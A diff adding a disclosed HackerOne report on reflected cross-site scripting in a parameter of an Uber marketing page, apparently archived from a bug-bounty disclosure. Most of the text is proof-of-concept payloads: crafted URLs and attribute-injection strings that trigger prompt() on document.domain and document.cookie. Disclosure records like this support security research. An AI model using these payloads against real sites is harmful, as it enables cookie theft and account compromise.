@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/156098
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/raghav_bisht
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:19.08.2016 17:32:23
+
+Summary:
+
+Vulnerable Domain :
+-------------------
+https://pages.et.uber.com/
+
+Vulnerable Link :
+-----------------
+https://pages.et.uber.com/icecream/?lang_id=5
+
+
+Edited Link With Payload :
+--------------------------
+https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain)%20bad%3d%22
+https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22
+https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(9020)%20bad%3d%22
+
+
+Payload Used :
+--------------
+
+" onmouseover%3dprompt(9020) bad%3d"
+" onmouseover%3dprompt(document.domain) bad%3d"
+" onmouseover%3dprompt(document.cookie) bad%3d"
